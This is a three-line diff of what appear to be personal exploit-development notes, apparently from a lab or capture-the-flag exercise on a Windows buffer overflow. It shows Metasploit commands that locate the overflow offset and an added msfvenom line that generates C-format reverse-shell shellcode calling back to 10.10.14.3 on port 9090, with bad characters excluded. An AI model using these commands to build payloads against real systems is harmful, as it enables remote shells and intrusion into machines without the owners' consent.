@@ -1,2 +1,3 @@
 /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1500
 /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 33694232 -l 1500 
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=9090 -f c -v shelcode -b '\x00\xb0\xda\xb1\xb2'
